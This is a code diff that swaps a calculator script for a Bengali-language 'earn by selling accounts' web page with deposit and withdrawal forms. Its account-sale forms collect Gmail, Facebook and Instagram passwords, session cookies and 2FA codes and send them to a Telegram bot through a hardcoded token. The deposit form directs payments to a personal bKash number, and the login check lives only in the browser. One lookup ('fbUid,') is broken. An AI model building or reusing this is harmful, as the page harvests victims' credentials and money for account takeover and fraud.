+                            <span id="depMethodLabel">Bkash পেমেন্ট নিয়ম নিচে দেওয়া হলো:</span>
+                            <strong id="adminNumber">01619861105</strong>
+                        </div>
+                        <button type="button" class="copy-btn" onclick="copyPassword('adminNumber', this)"><i class="fa-solid fa-copy"></i> Copy Number</button>
+                    </div>
+
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> এখানে অবশ্যই Send Money করবেন।</div>
+
+                    <div class="input-group">
+                        <label>আপনি কত টাকা অ্যাড করতে চান?</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-bangladeshi-taka-sign"></i>
+                            <input type="number" id="depAmount" placeholder="0.00" oninput="calculateDepositFee()" required>
+                        </div>
+                    </div>
+
+                    <!-- ডিপোজিট ক্যালকুলেশন বক্স -->
+                    <div class="calc-box">
+                        <div class="calc-row">
+                            <span>মূল অ্যামাউন্ট:</span>
+                            <span id="depCalcAmount">৳0.00</span>
+                        </div>
+                        <div class="calc-row fee">
+                            <span>পেমেন্ট ফি (0%):</span>
+                            <span id="depCalcFee">+ ৳0.00</span>
+                        </div>
+                        <div class="calc-row total">
+                            <span>আপনাকে পাঠাতে হবে:</span>
+                            <span id="depCalcTotal">৳0.00</span>
+                        </div>
+                        <div style="font-size: 11px; color: #34d399; margin-top: 8px; text-align: center;">
+                            <i class="fa-solid fa-circle-check"></i> <span id="depFinalSuccessMsg">আপনার ব্যালেন্স ৳0.00 যোগ হবে।</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>যে নাম্বার থেকে টাকা পাঠিয়েছেন</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-phone"></i>
+                            <input type="tel" id="senderNumber" placeholder="e.g. 01XXXXXXXXX" autocomplete="tel" required>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>পেমেন্ট স্ক্রিনশট</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-image"></i>
+                            <input type="file" id="depScreenshot" accept="image/*" style="padding-top: 9px;" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-account-btn">Submit Deposit Request <i class="fa-solid fa-paper-plane"></i></button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- উইথড্র পেজ -->
+    <div id="withdrawPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Withdraw Balance</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-solid fa-wallet"></i> উইথড্র নিয়মাবলী</h3>
+                <p>সর্বনিম্ন উইথড্র ৳৫০.০০ এবং উইথড্র চার্জ ৫%</p>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Request Withdrawal</h3>
+                    <p>আপনার পেমেন্টের তথ্য দিয়ে উইথড্র করুন</p>
+                </div>
+                <form id="withdrawForm" onsubmit="submitWithdraw(event)">
+                    <div class="input-group">
+                        <label>Select Payment Method</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-wallet"></i>
+                            <select id="withMethod" required>
+                                <option value="Bkash">Bkash</option>
+                                <option value="Nagad">Nagad</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Withdraw Amount (টাকার পরিমাণ)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-bangladeshi-taka-sign"></i>
+                            <input type="number" id="withAmount" placeholder="0.00" oninput="calculateWithdrawFee()" required>
+                        </div>
+                    </div>
+
+                    <div class="calc-box">
+                        <div class="calc-row">
+                            <span>Withdraw Amount:</span>
+                            <span id="calcAmount">৳0.00</span>
+                        </div>
+                        <div class="calc-row fee">
+                            <span>Withdraw Fee (5%):</span>
+                            <span id="calcFee">৳0.00</span>
+                        </div>
+                        <div class="calc-row total">
+                            <span>Total Payable:</span>
+                            <span id="calcTotal">৳0.00</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Your Wallet / Account Number</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-phone"></i>
+                            <input type="tel" id="withNumber" placeholder="Ex: 017XXXXXXXX" autocomplete="tel" required>
+                        </div>
+                    </div>
+                    
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> উইথড্র চার্জ: ৫%। পেমেন্ট পাঠানো হবে অ্যাডমিন নাম্বার থেকে।</div>
+                    <button type="submit" class="submit-account-btn">CONFIRM WITHDRAWAL</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- জিমেইল সেল পেজ -->
+    <div id="gmailPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Gmail Sell</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-solid fa-envelope"></i> Gmail Account Sell</h3>
+                <p>সহজেই জিমেইল সেল করে টাকা আয় করুন</p>
+                <div class="stats-row">
+                    <div class="stat-box"><span>RATE</span><h2>৳16.00</h2></div>
+                    <div class="stat-box"><span>LIMIT</span><h2>1000</h2></div>
+                    <div class="stat-box"><span>SUBMIT</span><h2>0</h2></div>
+                </div>
+            </div>
+
+            <div class="password-box">
+                <div class="pass-text">
+                    <span>Today's Password (<span id="currentDateLabel1"></span>):</span>
+                    <strong id="passText1">@MyJob_MKR16</strong>
+                </div>
+                <button class="copy-btn" onclick="copyPassword('passText1', this)"><i class="fa-solid fa-copy"></i> Copy</button>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Submit Your Account</h3>
+                    <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
+                </div>
+                <form id="gmailForm" onsubmit="submitAccount(event, 'Gmail')">
+                    <div class="input-group">
+                        <label>Gmail Address</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-envelope"></i>
+                            <input type="email" id="gmailEmail" placeholder="example@gmail.com" autocomplete="email" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Account Password</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="gmailPass" placeholder="Enter given password" autocomplete="current-password" required>
+                        </div>
+                    </div>
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> রিপোর্ট টাইম: ২০-৩০ ঘণ্টা</div>
+                    <button type="submit" class="submit-account-btn">SUBMIT GMAIL ACCOUNT</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ফেসবুক সেল পেজ -->
+    <div id="facebookPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Facebook Sell</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-brands fa-facebook"></i> Facebook Account Sell</h3>
+                <p>আপনার ফেসবুক একাউন্ট সেল করে পেমেন্ট নিন</p>
+                <div class="stats-row">
+                    <div class="stat-box"><span>RATE</span><h2>৳6.00</h2></div>
+                    <div class="stat-box"><span>LIMIT</span><h2>1000</h2></div>
+                    <div class="stat-box"><span>SUBMIT</span><h2>0</h2></div>
+                </div>
+            </div>
+
+            <div class="password-box">
+                <div class="pass-text">
+                    <span>Today's Password (<span id="currentDateLabel2"></span>):</span>
+                    <strong id="passText2">MYJOB_MKR16</strong>
+                </div>
+                <button class="copy-btn" onclick="copyPassword('passText2', this)"><i class="fa-solid fa-copy"></i> Copy</button>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Submit Your Account</h3>
+                    <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
+                </div>
+                <form id="facebookForm" onsubmit="submitAccount(event, 'Facebook')">
+                    <div class="input-group">
+                        <label>Facebook UID / Email / Number</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-envelope"></i>
+                            <input type="text" id="fbUid" placeholder="Enter Facebook UID" autocomplete="username" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Account Password</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="fbPass" placeholder="Enter Password" autocomplete="current-password" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Cookies</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-cookie"></i>
+                            <input type="text" id="fbCookies" placeholder="Paste Cookies here..." required>
+                        </div>
+                    </div>
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> রিপোর্ট টাইম: ১২-২৪ ঘণ্টা</div>
+                    <button type="submit" class="submit-account-btn">SUBMIT FACEBOOK ACCOUNT</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ইনস্টাগ্রাম সেল পেজ -->
+    <div id="instagramPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Instagram Sell</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-brands fa-instagram"></i> Instagram Account Sell</h3>
+                <p>ইনস্টাগ্রাম অ্যাকাউন্ট সেল করে ইনকাম করুন</p>
+                <div class="stats-row">
+                    <div class="stat-box"><span>RATE</span><h2>৳4.50</h2></div>
+                    <div class="stat-box"><span>LIMIT</span><h2>1000</h2></div>
+                    <div class="stat-box"><span>SUBMIT</span><h2>0</h2></div>
+                </div>
+            </div>
+
+            <div class="password-box">
+                <div class="pass-text">
+                    <span>Today's Password (<span id="currentDateLabel3"></span>):</span>
+                    <strong id="passText3">MYJOB_MKR16</strong>
+                </div>
+                <button class="copy-btn" onclick="copyPassword('passText3', this)"><i class="fa-solid fa-copy"></i> Copy</button>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Submit Your Account</h3>
+                    <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
+                </div>
+                <form id="instagramForm" onsubmit="submitAccount(event, 'Instagram')">
+                    <div class="input-group">
+                        <label>Instagram Username</label>
+                        <div class="input-field">
+                            <i class="fa-brands fa-instagram"></i>
+                            <input type="text" id="instaUser" placeholder="Enter Username" autocomplete="username" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Account Password</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="instaPass" placeholder="Enter Password" autocomplete="current-password" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Two-Factor (2FA) Code</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            <input type="text" id="insta2fa" placeholder="Enter 2FA Code" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="submit-account-btn">SUBMIT INSTAGRAM ACCOUNT</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- টেলিগ্রাম সাপোর্ট বাটন -->
+    <a href="https://t.me/abulkalam_mkr_bot" target="_blank" class="admin-support">
+        <i class="fa-solid fa-headset"></i>
+    </a>
+
+    <!-- জাভাস্ক্রিপ্ট -->
     <script>
-        let res = document.getElementById('result');
-        function appendValue(v) { res.innerText = (res.innerText === '0') ? v : res.innerText + v; }
-        function clearScreen() { res.innerText = '0'; }
-        function backspace() { res.innerText = (res.innerText.length > 1) ? res.innerText.slice(0, -1) : '0'; }
-        function calculate() { try { res.innerText = eval(res.innerText.replace('×', '*').replace('÷', '/')); } catch { res.innerText = 'Error'; } }
+        const BOT_TOKEN = '8588226486:AAHXTfZW_Yl1foxQ0l1so_7gqSfmkHg3iY';
+        const CHAT_ID = '7714324222';
+        const ADMIN_NUMBERS = {
+            'Bkash': '01619861105',
+            'Nagad': '01619861105'
+        };
+
+        // তারিখ অনুযায়ী পাসওয়ার্ড আপডেট এবং সেট করার ফাংশন
+        function updateDailyPasswords() {
+            const today = new Date();
+            const day = String(today.getDate()).padStart(2, '0');
+            const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+            const month = monthNames[today.getMonth()];
+            
+            const dateStr = `${day} ${month}`;
+
+            const gmailPass = `@MyJob_MKR${day}`;
+            const fbInstaPass = `MYJOB_MKR${day}`;
+
+            document.getElementById('passText1').innerText = gmailPass;
+            document.getElementById('passText2').innerText = fbInstaPass;
+            document.getElementById('passText3').innerText = fbInstaPass;
+
+            if(document.getElementById('currentDateLabel1')) document.getElementById('currentDateLabel1').innerText = dateStr;
+            if(document.getElementById('currentDateLabel2')) document.getElementById('currentDateLabel2').innerText = dateStr;
+            if(document.getElementById('currentDateLabel3')) document.getElementById('currentDateLabel3').innerText = dateStr;
+        }
+
+        // পেজ লোড হলে চেক করা এবং রেফারি হ্যান্ডেল করা
+        window.onload = function() {
+            // URL থেকে রেফার কোড চেক করা (যেমন: ?ref=017XXXXXXXX)
+            const urlParams = new URLSearchParams(window.location.search);
+            const refUser = urlParams.get('ref');
+            if (refUser) {
+                // ব্রাউজারে রেফারকারী ইউজারের তথ্য সেভ করে রাখা
+                localStorage.setItem('referredBy', refUser);
+            }
+
+            let isLoggedIn = localStorage.getItem('isLoggedIn');
+            if (isLoggedIn === 'true') {
+                showPage('homePage');
+            } else {
+                showPage('registerPage');
+            }
+
+            let userPhone = localStorage.getItem('savedPhone') || 'user';
+            let refLinkField = document.getElementById('myReferLink');
+            if(refLinkField) {
+                refLinkField.value = window.location.origin + window.location.pathname + '?ref=' + userPhone;
+            }
+
+            updateDailyPasswords();
+        };
+
+        function showPage(pageId) {
+            const pages = document.querySelectorAll('.section-page');
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+            
+            document.getElementById('profileDropdown').classList.remove('active');
+        }
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('active');
+            document.getElementById('overlay').classList.toggle('active');
+        }
+
+        function toggleProfileDropdown(event) {
+            event.stopPropagation();
+            document.getElementById('profileDropdown').classList.toggle('active');
+        }
+
+        window.onclick = function(event) {
+            let dropdown = document.getElementById('profileDropdown');
+            if (dropdown && dropdown.classList.contains('active')) {
+                dropdown.classList.remove('active');
+            }
+        }
+
+        function handleLogout() {
+            localStorage.removeItem('isLoggedIn');
+            alert('সফলভাবে লগআউট হয়েছে!');
+            showPage('loginPage');
+        }
+
+        function copyPassword(id, btn) {
+            var text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text);
+            btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+            setTimeout(() => { 
+                btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy'; 
+            }, 2000);
+        }
+
+        function copyReferLink(btn) {
+            let refInput = document.getElementById('myReferLink');
+            refInput.select();
+            navigator.clipboard.writeText(refInput.value);
+            btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+            setTimeout(() => { 
+                btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy'; 
+            }, 2000);
+        }
+
+        function checkDeviceLimit(event) {
+            event.preventDefault();
+            
+            let pass = document.getElementById('regPass').value;
+            let passConfirm = document.getElementById('regPassConfirm').value;
+
+            if (pass !== passConfirm) {
+                alert("দুঃখিত! দুটি পাসওয়ার্ড বা পিন এক হয়নি। দয়া করে মিলিয়ে লিখুন।");
+                return;
+            }
+
+            let count = parseInt(localStorage.getItem('mkrAccCount') || 0);
+            if (count >= 3) { 
+                alert("দুঃখিত! এই ডিভাইসে সর্বোচ্চ ৩টি অ্যাকাউন্ট খোলার লিমিট পূর্ণ হয়ে গেছে।");
+                return;
+            }
+            
+            let name = document.getElementById('regName').value;
+            let phone = document.getElementById('regPhone').value;
+            let email = document.getElementById('regEmail').value;
+
+            localStorage.setItem('savedEmail', email);
+            localStorage.setItem('savedPass', pass);
+            localStorage.setItem('savedPhone', phone);
+            localStorage.setItem('hasSubmittedTask', 'false');
+            localStorage.setItem('mkrAccCount', count + 1);
+
+            // রেফারি লজিক কাউন্ট (রেফার করলে ১ অথবা ২ রেকর্ড হ্যান্ডেল করা)
+            let referredBy = localStorage.getItem('referredBy');
+            if (referredBy) {
+                let refCountKey = 'ref_count_' + referredBy;
+                let currentRefCount = parseInt(localStorage.getItem(refCountKey) || 0) + 1;
+                
+                // রিকোয়ারমেন্ট অনুযায়ী ১ বা ২ রেক লেখার লজিক
+                if (currentRefCount === 1) {
+                    localStorage.setItem(refCountKey, '1 রেক (প্রথম রেফার)');
+                } else {
+                    localStorage.setItem(refCountKey, '2 রেক (দ্বিতীয় বা ততোধিক রেফার)');
+                }
+            }
+
+            alert('রেজিস্ট্রেশন সফল হয়েছে! এখন আপনার জিমেইল ও পাসওয়ার্ড দিয়ে লগইন করুন।');
+            
+            // সফল হওয়ার পর অন্য পেজে রিডাইরেক্ট (লগইন পেজে যাচ্ছে)
+            showPage('loginPage');
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            let inputEmail = document.getElementById('loginEmail').value;
+            let inputPass = document.getElementById('loginPass').value;
+
+            let savedEmail = localStorage.getItem('savedEmail');
+            let savedPass = localStorage.getItem('savedPass');
+
+            if (savedEmail && (inputEmail !== savedEmail || inputPass !== savedPass)) {
+                alert('ভুল জিমেইল অথবা পাসওয়ার্ড দিয়েছেন!');
+                return;
+            }
+
+            localStorage.setItem('isLoggedIn', 'true');
+            alert('লগইন সফল হয়েছে!');
+            
+            // সফলভাবে লগইন হওয়ার পর হোম পেজে রিডাইরেক্ট
+            showPage('homePage');
+        }
+
+        function updateDepositInfo() {
+            let method = document.getElementById('depMethod').value;
+            document.getElementById('adminNumber').innerText = ADMIN_NUMBERS[method];
+            document.getElementById('depMethodLabel').innerText = method + ' পেমেন্ট নিয়ম নিচে দেওয়া হলো:';
+            calculateDepositFee();
+        }
+
+        function calculateDepositFee() {
+            let amountInput = document.getElementById('depAmount').value;
+            let amount = parseFloat(amountInput);
+            
+            if (isNaN(amount) || amount <= 0) {
+                document.getElementById('depCalcAmount').innerText = "৳0.00";
+                document.getElementById('depCalcFee').innerText = "+ ৳0.00";
+                document.getElementById('depCalcTotal').innerText = "৳0.00";
+                document.getElementById('depFinalSuccessMsg').innerText = "আপনার ব্যালেন্স ৳0.00 যোগ হবে।";
+                return;
+            }
+            
+            let fee = 0;
+            let total = amount + fee;
+
+            document.getElementById('depCalcAmount').innerText = `৳${amount.toFixed(2)}`;
+            document.getElementById('depCalcFee').innerText = `+ ৳${fee.toFixed(2)}`;
+            document.getElementById('depCalcTotal').innerText = `৳${total.toFixed(2)}`;
+            document.getElementById('depFinalSuccessMsg').innerText = `আপনার ব্যালেন্স ৳${amount.toFixed(2)} যোগ হবে।`;
+        }
+
+        function submitDeposit(event) {
+            event.preventDefault();
+            
+            let method = document.getElementById('depMethod').value;
+            let sender = document.getElementById('senderNumber').value;
+            let amount = document.getElementById('depAmount').value;
+            let targetAdminNum = ADMIN_NUMBERS[method];
+
+            let message = `💰 নতুন ডিপোজিট রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 প্রেরক নাম্বার: ${sender}\n💵 পরিমাণ: ৳${amount}\n📌 পাঠানো হয়েছে এই নাম্বারে: ${targetAdminNum}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert('ডিপোজিট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!');
+                    event.target.reset();
+                    updateDepositInfo();
+                    
+                    // সাকসেস হওয়ার পর হোম পেজে রিডাইরেক্ট
+                    showPage('homePage');
+                } else {
+                    alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                }
+            }).catch(error => {
+                alert('নেটওয়ার্ক ত্রুটি!');
+            });
+        }
+
+        function calculateWithdrawFee() {
+            let amountInput = document.getElementById('withAmount').value;
+            let amount = parseFloat(amountInput);
+            
+            if (isNaN(amount) || amount <= 0) {
+                document.getElementById('calcAmount').innerText = "৳0.00";
+                document.getElementById('calcFee').innerText = "৳0.00";
+                document.getElementById('calcTotal').innerText = "৳0.00";
+                return;
+            }
+            
+            let fee = amount * 0.05;
+            let total = amount - fee;
+
+            document.getElementById('calcAmount').innerText = `৳${amount.toFixed(2)}`;
+            document.getElementById('calcFee').innerText = `৳${fee.toFixed(2)}`;
+            document.getElementById('calcTotal').innerText = `৳${total.toFixed(2)}`;
+        }
+
+        function submitWithdraw(event) {
+            event.preventDefault();
+            
+            let method = document.getElementById('withMethod').value;
+            let number = document.getElementById('withNumber').value;
+            let amount = parseFloat(document.getElementById('withAmount').value);
+
+            if (amount < 50) {
+                alert("দুঃখিত! সর্বনিম্ন উইথড্র পরিমাণ ৫০ টাকা।");
+                return;
+            }
+            
+            let charge = amount * 0.05;
+            let finalAmount = amount - charge;
+
+            let message = `💸 নতুন উইথড্র রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 গ্রহণকারী নাম্বার: ${number}\n💵 উইথড্র পরিমাণ: ৳${amount}\n🔻 ৫% চার্জ: ৳${charge.toFixed(2)}\n✅ প্রদেয় পরিমাণ: ৳${finalAmount.toFixed(2)}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert('উইথড্র রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে! ৫% চার্জ কেটে খুব শীঘ্রই পেমেন্ট দেওয়া হবে।');
+                    event.target.reset();
+                    calculateWithdrawFee();
+                    
+                    // সাকসেস হওয়ার পর হোম পেজে রিডাইরেক্ট
+                    showPage('homePage');
+                } else {
+                    alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                }
+            }).catch(error => {
+                alert('নেটওয়ার্ক ত্রুটি!');
+            });
+        }
+
+        function submitAccount(event, platform) {
+            event.preventDefault();
+            
+            localStorage.setItem('hasSubmittedTask', 'true');
+
+            let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n🔹 প্ল্যাটফর্ম: ${platform}\n`;
+
+            if (platform === 'Gmail') {
+                let email = document.getElementById('gmailEmail').value;
+                let pass = document.getElementById('gmailPass').value;
+                message += `📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
+            } else if (platform === 'Facebook') {
+                let uid = document.getElementById('fbUid,').value || document.getElementById('fbUid').value;
+                let pass = document.getElementById('fbPass').value;
+                let cookies = document.getElementById('fbCookies').value;
+                message += `👤 UID/Email: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
+            } else if (platform === 'Instagram') {
+                let user = document.getElementById('instaUser').value;
+                let pass = document.getElementById('instaPass').value;
+                let twofa = document.getElementById('insta2fa').value;
+                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${twofa}`;
+            }
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে।');
+                    event.target.reset();
+                    
+                    // কাজ সফলভাবে সাবমিট হওয়ার পর হোম পেজে রিডাইরেক্ট
+                    showPage('homePage');
+                } else {
+                    alert('সাবমিট করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                }
+            }).catch(error => {
+                alert('নেটওয়ার্ক ত্রুটি!');
+            });
+        }
     </script>
 </body>
 </html>
